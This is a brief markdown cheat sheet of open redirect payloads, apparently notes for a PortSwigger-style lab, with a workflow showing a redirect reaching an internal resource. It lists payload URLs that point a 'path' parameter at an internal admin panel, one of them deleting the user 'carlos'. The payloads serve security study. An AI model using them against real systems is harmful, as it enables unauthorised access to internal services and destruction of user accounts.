# Open Redirect Payloads

## Generic Example

```text
/redirect?next=http://example.com
```

---

## PortSwigger-Style Example

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

---

## Delete User

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

---

## Workflow

Allowed URL

↓

Open Redirect

↓

Internal Resource

↓

Sensitive Response

---

## Notes

Always verify whether the backend follows redirects automatically and whether redirected destinations are revalidated.